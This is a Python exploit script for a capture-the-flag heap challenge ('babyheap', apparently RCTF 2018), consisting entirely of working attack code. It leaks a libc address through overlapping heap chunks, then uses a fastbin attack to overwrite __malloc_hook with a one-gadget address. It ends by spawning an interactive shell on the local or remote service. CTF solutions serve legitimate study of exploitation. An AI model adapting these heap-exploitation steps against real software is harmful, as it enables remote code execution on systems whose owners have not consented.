import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a):
    return struct.pack("<Q",a)

def u(a):
    return struct.unpack("<Q",a)[0]

def alloc(size,content):
    read_until(f,"choice:")
    f.write("1\n")
    read_until(f,"size:")
    f.write(str(size)+"\n")
    read_until(f,"content:")
    f.write(content)

def show(index):
    read_until(f,"choice:")
    f.write("2\n")
    read_until(f,"index:")
    f.write(str(index)+"\n")

def delete(index):
    read_until(f,"choice:")
    f.write("3\n")
    read_until(f,"index:")
    f.write(str(index)+"\n")
    

def main():
    alloc(136,"A"*128+"\n")
    alloc(256,"B"*256)
    alloc(136,"C"*128+"\n")
    delete(0)
    delete(1)
    alloc(136,"D"*128+p(0x90))
    alloc(128,"E"*128)
    alloc(16,"F"*16)
    alloc(16,"G"*16)
    delete(1)
    delete(2)
    alloc(128,"H"*128)
    alloc(128,"I"*128)
    alloc(128,"J"*128)
    delete(2)
    # leak libc addr
    show(3)
    read_until(f,"content: ")
    top_addr = u(f.read(6)+"\x00"*2) 
    print "top_addr: ",hex(top_addr)
    libc_base = top_addr - 0x3c4b78
    print "libc base: ",hex(libc_base)
    target = top_addr - 0x8b 
    print "target_addr: ",hex(target)
    malloc_hook = libc_base + malloc_hook_offset
    print "malloc_hook: ",hex(malloc_hook)
    one_rce = libc_base + one_rce_offset
    print "one_rce: ",hex(one_rce)

    # create fake chunks and free fake chunks to write one_rce in __malloc_hook
    delete(1)
    delete(5)
    alloc(256,"H"*128+p(0)+p(0x71)+"F"*16+p(0)+p(0x71)+"G"*16+p(0)*7+p(0x91))
    alloc(128,p(0)+p(0x91)+"\n")
    delete(3)
    delete(4)
    delete(1)
    alloc(256,"H"*128+p(0)+p(0x71)+"F"*16+p(0)+p(0x71)+p(target)+"G"*8+"\n")
    alloc(96,"H"*8+"\n")
    alloc(96,"A"*19+p(one_rce)+"\n")

    # trigger malloc_hook
    read_until(f,"choice:")
    f.write("1\n")
    read_until(f,"size:")
    f.write("256\n")
    
    
    shell(s)

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("babyheap.2018.teamrois.cn", 3154)
        one_rce_offset = 0x4526a
        #one_rce_offset = 0xf02a4
        #one_rce_offset = 0xf1147
        malloc_hook_offset = 0x00000000003c4b10
        main()
    else:
        s, f = sock("localhost", 3154)
        one_rce_offset = 0x4526a
        #one_rce_offset = 0xf02a4
        #one_rce_offset = 0xf1147
        malloc_hook_offset = 0x00000000003c4b10
        main()
